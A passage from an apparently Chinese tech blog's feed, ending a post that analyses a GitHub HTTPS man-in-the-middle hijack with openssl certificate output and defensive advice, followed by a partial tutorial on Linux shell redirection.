30 de 55 51 4a   ..je.&lt;D..Y^0.UQJ</span><br><span class="line">    0030 - f4 9e 51 c9 35 ee ff a9-62 60 a2 7d 63 <span class="built_in">fc</span> c1 f9   ..Q.5...b`.&#125;c...</span><br><span class="line">    0040 - a4 bf 41 c5 2f 42 9a 7c-6d b0 99 49 63 1c 0f 5c   ..A./B.|m..Ic..\</span><br><span class="line">    0050 - 37 ce 32 85 e6 fb 49 5a-01 97 9d 23 6c c6 9e b3   7.2...IZ...<span class="comment">#l...</span></span><br><span class="line">    0060 - 56 dc ae c6 76 cf c6 ba-95 16 c6 c8 57 d1 be c7   V...v.......W...</span><br><span class="line">    0070 - d0 a3 f9 66 c6 4e a9 99-52 60 fe 53 61 9d 15 b1   ...f.N..R`.Sa...</span><br><span class="line">    0080 - d2 1f a0 3c 0c 78 41 af-d8 ac 59 95 9f c9 2f 1c   ...&lt;.xA...Y.../.</span><br><span class="line">    0090 - 07 25 74 3e ae 28 03 1f-1b fd 0d b4 f8 c3 ad 4f   .%t&gt;.(.........O</span><br><span class="line"></span><br><span class="line">    Start Time: 1585268898</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify <span class="built_in">return</span> code: 19 (self signed certificate <span class="keyword">in</span> certificate chain)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">DONE</span><br></pre></td></tr></table></figure></details><h3 id="香港阿里云"><a href="#香港阿里云" class="headerlink" title="香港阿里云"></a>香港阿里云</h3><details>  <summary>点击展开</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</span><br><span class="line">CONNECTED(00000005)</span><br><span class="line">depth=2 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=1 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line">   i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1</span><br><span class="line">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3</span><br><span class="line">d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk</span><br><span class="line">IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy</span><br><span class="line">MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB</span><br><span class="line">BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF</span><br><span class="line">Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG</span><br><span class="line">A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD</span><br><span class="line">VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA</span><br><span class="line">xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ</span><br><span class="line">w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj</span><br><span class="line">/4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE</span><br><span class="line">sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ</span><br><span class="line">xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM</span><br><span class="line">fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag</span><br><span class="line">re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG</span><br><span class="line">A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE</span><br><span class="line">AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0</span><br><span class="line">oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy</span><br><span class="line">LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy</span><br><span class="line">dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB</span><br><span class="line">FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF</span><br><span class="line">BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS</span><br><span class="line">BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0</span><br><span class="line">U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA</span><br><span class="line">MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY</span><br><span class="line">BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT</span><br><span class="line">Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg</span><br><span class="line">U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE</span><br><span class="line">AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51</span><br><span class="line">vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV</span><br><span class="line">CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN</span><br><span class="line">8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG</span><br><span class="line">eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v</span><br><span class="line">ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN</span><br><span class="line">HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB</span><br><span class="line">Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk</span><br><span class="line">myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq</span><br><span class="line">WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik=</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"> 1 s:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">   i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs</span><br><span class="line">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3</span><br><span class="line">d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j</span><br><span class="line">ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL</span><br><span class="line">MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3</span><br><span class="line">LmRpZ2ljZXJ0LmNvbTE0MDIGA1UEAxMrRGlnaUNlcnQgU0hBMiBFeHRlbmRlZCBW</span><br><span class="line">YWxpZGF0aW9uIFNlcnZlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="line">ggEBANdTpARR+JmmFkhLZyeqk0nQOe0MsLAAh/FnKIaFjI5j2ryxQDji0/XspQUY</span><br><span class="line">uD0+xZkXMuwYjPrxDKZkIYXLBxA0sFKIKx9om9KxjxKws9LniB8f7zh3VFNfgHk/</span><br><span class="line">LhqqqB5LKw2rt2O5Nbd9FLxZS99RStKh4gzikIKHaq7q12TWmFXo/a8aUGxUvBHy</span><br><span class="line">/Urynbt/DvTVvo4WiRJV2MBxNO723C3sxIclho3YIeSwTQyJ3DkmF93215SF2AQh</span><br><span class="line">cJ1vb/9cuhnhRctWVyh+HA1BV6q3uCe7seT6Ku8hI3UarS2bhjWMnHe1c63YlC3k</span><br><span class="line">8wyd7sFOYn4XwHGeLN7x+RAoGTMCAwEAAaOCAUkwggFFMBIGA1UdEwEB/wQIMAYB</span><br><span class="line">Af8CAQAwDgYDVR0PAQH/BAQDAgGGMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEF</span><br><span class="line">BQcDAjA0BggrBgEFBQcBAQQoMCYwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRp</span><br><span class="line">Z2ljZXJ0LmNvbTBLBgNVHR8ERDBCMECgPqA8hjpodHRwOi8vY3JsNC5kaWdpY2Vy</span><br><span class="line">dC5jb20vRGlnaUNlcnRIaWdoQXNzdXJhbmNlRVZSb290Q0EuY3JsMD0GA1UdIAQ2</span><br><span class="line">MDQwMgYEVR0gADAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5j</span><br><span class="line">b20vQ1BTMB0GA1UdDgQWBBQ901Cl1qCt7vNKYApl0yHU+PjWDzAfBgNVHSMEGDAW</span><br><span class="line">gBSxPsNpA/i/RwHUmCYaCALvY2QrwzANBgkqhkiG9w0BAQsFAAOCAQEAnbbQkIbh</span><br><span class="line">hgLtxaDwNBx0wY12zIYKqPBKikLWP8ipTa18CK3mtlC4ohpNiAexKSHc59rGPCHg</span><br><span class="line">4xFJcKx6HQGkyhE6V6t9VypAdP3THYUYUN9XR3WhfVUgLkc3UHKMf4Ib0mKPLQNa</span><br><span class="line">2sPIoc4sUqIAY+tzunHISScjl2SFnjgOrWNoPLpSgVh5oywM395t6zHyuqB8bPEs</span><br><span class="line">1OG9d4Q3A84ytciagRpKkk47RpqF/oOi+Z6Mo8wNXrM9zwR4jxQUezKcxwCmXMS1</span><br><span class="line">oVWNWlZopCJwqjyBcdmdqEU79OX2olHdx3ti6G8MdOu42vi/hw15UJGQmxg7kVkn</span><br><span class="line">8TUoE6smftX3eg==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">subject=businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line"></span><br><span class="line">issuer=C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA256</span><br><span class="line">Peer signature <span class="built_in">type</span>: RSA-PSS</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 3621 bytes and written 376 bytes</span><br><span class="line">Verification: OK</span><br><span class="line">---</span><br><span class="line">New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256</span><br><span class="line">Server public key is 2048 bit</span><br><span class="line">Secure Renegotiation IS NOT supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">Early data was not sent</span><br><span class="line">Verify <span class="built_in">return</span> code: 0 (ok)</span><br><span class="line">---</span><br><span class="line">DONE</span><br></pre></td></tr></table></figure></details><h2 id="实施手段"><a href="#实施手段" class="headerlink" title="实施手段"></a>实施手段</h2><p>通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的</p><p>通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书</p><p>并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起</p><p>TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容</p><p>而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容</p><p>所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露</p><h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><p>作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 <code>忽略警告</code> 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露</p><p>当然，像昨天那种针对 Github Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据</p><p>作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了</p><p>同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免</p><blockquote><p>因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零<br>因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子&lt;/p&gt;
&lt;p&gt;当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件&lt;/p&gt;
&lt;p&gt;今天早晨8
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="github" scheme="https://blog.lgf.im/tags/github/"/>
    
      <category term="MITM" scheme="https://blog.lgf.im/tags/MITM/"/>
    
      <category term="https" scheme="https://blog.lgf.im/tags/https/"/>
    
      <category term="hijack" scheme="https://blog.lgf.im/tags/hijack/"/>
    
  </entry>
  
  <entry>
    <title>Linux Shell中的重定向</title>
    <link href="https://blog.lgf.im/2020/redirect-in-shell.html"/>
    <id>https://blog.lgf.im/2020/redirect-in-shell.html</id>
    <published>2020-03-24T07:50:07.000Z</published>
    <updated>2020-06-18T05:55:25.999Z</updated>
    
    <content type="html"><![CDATA[<p>经常会看到别人的shell脚本后面有一个 <code>2&gt;&amp;1</code> ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。</p><h2 id="特殊的东西"><a href="#特殊的东西" class="headerlink" title="特殊的东西"></a>特殊的东西</h2><p>先来看一点linux中特殊的东西，为后面的内容打下基础</p><h3 id="特殊的文件"><a href="#特殊的文件" class="headerlink" title="特殊的文件"></a>特殊的文件</h3><ul><li><code>/dev/null</code> 空，可以将垃圾内容导入其中，就会消失</li><li><code>/dev/zero</code> 零，可以从中读出无穷无尽的0</li><li><code>/dev/urandom</code> 随机数，可以从中读出无穷无尽的随机数</li><li><code>/dev/stdin</code> 标准输入流</li><li><code>/dev/stdout</code> 标准输出流</li><li><code>/dev/stderr</code> 标准错误输出流</li></ul><p>我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\1\2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stderr -&gt; /proc/self/fd/2</span><br><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stdin -&gt; /proc/self/fd/0</span><br><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stdout -&gt; /proc/self/fd/1</span><br></pre></td></tr></table></figure><h3 id="特殊的文件描述符"><a href="#特殊的文件描述符" class="headerlink" title="特殊的文件描述符"></a>特殊的文件描述符</h3><p>在Linux shell中有三个特殊的文件描述符（<code>File descriptor</code> or <code>fd</code>）:</p><ul><li>fd<code>0</code> 是标准输入: <code>stdin</code></li><li>fd<code>1</code> 是标准输出: <code>stdout</code></li><li>fd<code>2</code> 是标准错误输出: <code>stderr</code></li></ul><p>通过这三个特殊的文件描述符我们可以控制输入输出流</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>我们经常会接触到 <code>&gt;</code> 这个符号，叫做重定向，其实还有另一个符号 <code>&gt;&gt;</code> 有着类似的功能，他们之间有一点小区别：</p><ul><li><code>&gt;</code> 是覆盖的方式</li><li><code>&gt;&gt;</code> 是追加的方式</li></ul><blockquote><p>下面的内容将全部以 <code>&gt;</code> 为例，<code>&gt;&gt;</code> 除了内容是追加之外没有其他区别，就不赘述</p></blockquote><h2 id="使用重定向"><a href="#使用重定向" class="headerlink" title="使用重定向"></a>使用重定向</h2><h3 id="重定向到文件"><a href="#重定向到文件" class="headerlink" title="重定向到文件"></a>重定向到文件</h3><p>先来看一下最基本的重定向的使用方法，我们将 <code>echo</code> 命令的输出重定向到一个文件中</p><p><code>echo &quot;hello&quot; &gt; a.txt</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># echo "hello" &gt; a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里是将 <strong>stdout</strong> 重定向到文件 <strong>a.txt</strong> 中，与下面的命令等价</p><p><code>echo &quot;hello&quot; 1&gt; a.txt</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># rm a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># echo "hello" 1&gt; a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里我们看到重定向符号 <code>&gt;</code> 默认是将 <code>stdout</code> 也就是 fd<code>1</code> 重定向到别处</p><p>如果我们想要将标准错误输出<code>stderr</code>进行重定向，只需要将上面命令中的文件描述符<code>1</code>修改为标准错误输出的文件描述符<code>2</code>即可</p><h3 id="重定向到文件描述符"><a href="#重定向到文件描述符" class="headerlink" title="重定向到文件描述符"></a>重定向到文件描述符</h3><p>有些情况下 <code>stderr</code> 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中</p><p>我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 <code>ls</code> 命令查看一个不存在的目录，这样会产生错误输出</p><blockquote><p>这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕</p></blockquote><p><code>ls error 2&gt;1</code></p><p>这里我们的猜想是将 <code>stderr</code> 重定向到 <code>stdout</code>, 所以写了 <code>2&gt;1</code>, 我们来看一下会不会成功？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls error 2&gt;1</span></span><br><span class="line">root@ubuntu:~<span class="comment">#</span></span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">1</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 1</span></span><br><span class="line">ls: cannot access <span class="string">'error'</span>: No such file or directory</span><br></pre></td></tr></table></figure><p>我们看到了，并没有输出，而是在当前目录下生成了一个文件 <code>1</code>, 这说明如果我们只写 <code>&gt;1</code> 会被当做重定向到文件 <code>1</code> 中</p><p>此时，我们的 <code>&amp;</code> 就要上场了</p><p><code>&gt;&amp;</code> 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd<code>1</code>, 也就是 <code>&amp;1</code></p><p><code>ls error 2&gt;&amp;1</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls error 2&gt;&amp;1</span></span><br><span class="line">ls: cannot access <span class="string">'error'</span>: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>到这里我们就可以自主发挥了</p></blockquote><p>将标准输出重定向到标准错误输出</p><p><code>echo &quot;hello&quot; 1&gt;&amp;2</code> or <code>echo &quot;hello&quot; &gt;&amp;2</code></p><p>甚至我们可以玩点复杂的</p><p><code>(echo &quot;hello&quot; &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># (echo "hello" &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里的文件描述符<code>9</code>会自动生成，但是去除括号就会提示错误了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># echo "hello" &gt;&amp;9 9&gt;&amp;2 2&gt;&amp;1</span></span><br><span class="line">bash: 9: Bad file descriptor</span><br></pre></td></tr></table></figure><p>在 bash &gt;4.0 的版本中，又出了新的重定向语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -ld /tmp /tnt 2&gt; &gt;(sed <span class="string">'s/^/E: /'</span>) &gt; &gt;(sed <span class="string">'s/^/O: /'</span>)</span><br><span class="line">O: drwxrwxrwt 17 root root 28672 Nov  5 23:00 /tmp</span><br><span class="line">E: ls: cannot access /tnt: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>这种写法我还没有学习，等我后面学会了再进行更新</p></blockquote><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><p>来点高端点的用法</p><p>用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总</p><p><code>((ls -ld /tmp /tnt |sed &#39;s/^/O: /&#39; &gt;&amp;9 ) 2&gt;&amp;1 |sed &#39;s/^/E: /&#39;) 9&gt;&amp;1| cat -n</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ((ls -ld /tmp /tnt |sed 's/^/O: /' &gt;&amp;9 ) 2&gt;&amp;1 |sed 's/^/E: /') 9&gt;&amp;1| cat -n</span></span><br><span class="line">     1  O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp</span><br><span class="line">     2  E: ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br></pre></td></tr></table></figure><p>相同作用的新版语法</p><p><code>cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed &#39;s/^/E: /&#39;) &gt; &gt;(sed &#39;s/^/O: /&#39;))</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed 's/^/E: /') &gt; &gt;(sed 's/^/O: /'))</span></span><br><span class="line">     1  O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp</span><br><span class="line">     2  E: ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br></pre></td></tr></table></figure><h3 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h3><p>将输出文件 m 和 n 合并: <code>n &gt;&amp; m</code></p><p>将输入文件 m 和 n 合并: <code>n &lt;&amp; m</code></p><h3 id="输入边界"><a href="#输入边界" class="headerlink" title="输入边界"></a>输入边界</h3><p>将开始标记 tag 和结束标记 tag 之间的内容作为输入: <code>&lt;&lt; tag</code></p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># wc -l &lt;&lt; EOF</span></span><br><span class="line">    document line 1</span><br><span class="line">    document line 2</span><br><span class="line">    document line 3</span><br><span class="line">EOF</span><br><span class="line">3 //表明收到3行输入</span><br></pre></td></tr></table></figure><p>它的作用是将两个 EOF 